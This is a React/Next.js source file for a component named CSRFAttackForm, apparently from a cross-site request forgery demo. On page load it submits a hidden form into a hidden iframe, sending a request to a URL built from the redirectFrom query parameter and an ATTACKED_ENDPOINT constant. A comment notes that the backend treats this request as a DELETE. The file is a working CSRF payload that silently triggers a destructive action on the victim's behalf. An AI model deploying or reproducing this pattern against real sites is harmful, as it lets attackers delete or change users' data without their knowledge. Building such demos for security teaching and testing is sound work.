import { useEffect, useRef } from "react";
import { useRouter } from "next/router";
import { ATTACKED_ENDPOINT } from "@/constants/http.contants";

export function CSRFAttackForm() {
  const formRef = useRef<HTMLFormElement>(null);
  const router = useRouter();
  const { redirectFrom } = router.query;

  useEffect(() => {
    if (redirectFrom && formRef) {
      formRef?.current?.submit();
    }
  }, [redirectFrom, formRef]);

  return (
    <>
      <iframe className="hidden" name="csrf-frame"></iframe>
      <form
        ref={formRef}
        action={redirectFrom + ATTACKED_ENDPOINT}
        method="GET" // On backend, GET is override as DELETE
        target="csrf-frame"
      ></form>
    </>
  );
}
